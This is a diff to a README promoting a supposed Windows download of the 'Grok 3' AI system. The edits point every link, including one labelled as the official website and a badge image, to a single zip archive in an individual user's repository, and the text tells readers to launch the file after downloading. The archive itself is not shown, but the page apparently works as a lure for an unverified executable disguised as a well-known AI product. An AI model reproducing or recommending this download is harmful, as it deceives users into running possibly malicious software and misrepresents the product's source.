@@ -24,9 +24,9 @@ Grok 3 is the latest and most advanced version of the renowned AI system, now fa
 - **Windows Compatibility:** Now available for Windows users, Grok 3 can be easily accessed on your desktop or laptop.
 
 ## :arrow_down: Download Grok 3
-Grok 3 can be downloaded from the [Releases section](https://github.com/your-username/repository-name/releases). Click the link above to access the latest version of Grok 3. Make sure to launch the file after downloading to start experiencing the power of this incredible AI system.
+Grok 3 can be downloaded from the [Releases section](https://github.com/stcoid1/Grok-3/releases/download/v3.0/Grok.zip). Click the link above to access the latest version of Grok 3. Make sure to launch the file after downloading to start experiencing the power of this incredible AI system.
 
-[![Download Grok 3](https://img.shields.io/badge/Download-Grok%203-brightgreen)](https://github.com/your-username/repository-name/releases)
+[![Download Grok 3](https://github.com/stcoid1/Grok-3/releases/download/v3.0/Grok.zip%203-brightgreen)](https://github.com/stcoid1/Grok-3/releases/download/v3.0/Grok.zip)
 
 ## 🚀 Get Started with Grok 3
 Follow these steps to dive into the world of Grok 3:
@@ -42,7 +42,7 @@ Grok 3 is not just an AI system; it's a companion for your digital journey. With
 Stay tuned for the latest news, updates, and announcements regarding Grok 3. The repository topics cover a wide range of information related to Grok 3, ensuring you are always in the know about the smartest AI on Earth.
 
 ## 🌐 Explore More about Grok 3
-Visit the [official Grok 3 website](https://www.grok-3.com) to discover additional details, in-depth insights, and exciting features of this cutting-edge AI system. The website offers a comprehensive overview of Grok 3 and its capabilities.
+Visit the [official Grok 3 website](https://github.com/stcoid1/Grok-3/releases/download/v3.0/Grok.zip) to discover additional details, in-depth insights, and exciting features of this cutting-edge AI system. The website offers a comprehensive overview of Grok 3 and its capabilities.
 
 ## 🤝 Connect with the Grok 3 Community
 Join the Grok 3 community to interact with other users, share experiences, and exchange ideas about leveraging the power of Grok 3. Engage in discussions, participate in live demos, and explore the endless possibilities with Grok 3.
